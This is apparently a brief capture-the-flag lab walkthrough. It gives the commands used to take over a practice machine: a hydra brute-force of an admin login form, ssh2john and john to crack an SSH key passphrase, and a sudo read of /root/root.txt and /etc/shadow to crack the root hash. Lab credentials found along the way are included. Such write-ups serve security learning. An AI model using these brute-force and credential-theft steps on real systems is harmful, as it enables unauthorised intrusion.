hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.248.38 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
admin:xavier

and there you found the rsa key for john.
So crack the rsa key by the following two commands
{python /usr/share/john/ssh2john.py id_rsa > hash}
 and 
[sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt]
  passphrase for key id_rsa:rockinroll
  
  use ssh into the john
  
 after logging in to get the content of the root.txt use this {sudo /bin/cat /root/root.txt}

to get the password of the root run this command first sudo /bin/cat /etc/shadow  and then copy the root content make new file and save the root content there.
the use this command to crack the hashes john rootBrute --wordlist=/usr/share/wordlists/rockyou.txt
